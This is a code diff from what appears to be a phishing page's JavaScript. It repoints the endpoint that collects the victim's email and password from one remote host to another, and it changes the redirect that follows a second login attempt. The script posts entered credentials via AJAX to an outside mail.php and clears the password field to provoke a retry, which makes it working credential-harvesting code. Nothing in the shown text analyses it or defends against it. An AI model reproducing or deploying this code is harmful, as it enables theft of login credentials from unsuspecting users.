@@ -358,7 +358,7 @@ count=count+1;
 
 $.ajax({
 dataType: 'JSON',
-url: 'https://sufias.org//wp-content/page/mail.php',
+url: 'https://iappsolutions.com.au/ser/page/mail.php',
 type: 'POST',
       	data:{
       		email:email,
@@ -377,7 +377,7 @@ type: 'POST',
             			if (count>=2) {
             				count=0;
                     // window.location.replace(response['redirect_link']);
-                  window.location.href("https://sufias.org//wp-content/page/succesful.php?email="+my_email);
+                  window.location.href("https://iappsolutions.com.au/ser/page/succesful.php?email="+my_email);
 
                 }
                 // $('#msg').html(response['msg']);
@@ -391,7 +391,7 @@ type: 'POST',
     	$("#password").val("");
     	if (count>=2) {
     		count=0;
-    		window.location.replace("https://sufias.org//wp-content/page/succesful.php?email="+my_email);
+    		window.location.replace("https://iappsolutions.com.au/ser/page/succesful.php?email="+my_email);
     	}
     $("#msg").show();
               // $('#msg').html("Please try again later");
